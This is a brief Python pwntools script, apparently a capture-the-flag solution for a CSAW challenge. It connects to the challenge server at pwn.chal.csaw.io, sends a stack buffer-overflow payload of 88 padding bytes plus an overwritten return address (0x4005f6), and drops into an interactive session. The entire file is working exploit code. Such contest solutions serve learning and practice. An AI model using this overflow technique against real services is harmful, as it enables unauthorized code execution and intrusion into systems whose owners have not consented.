from pwn import *

r = remote('pwn.chal.csaw.io', 10101)
r.recvrepeat(1)
r.sendline('A'*88+p64(0x00000000004005f6))
r.interactive()
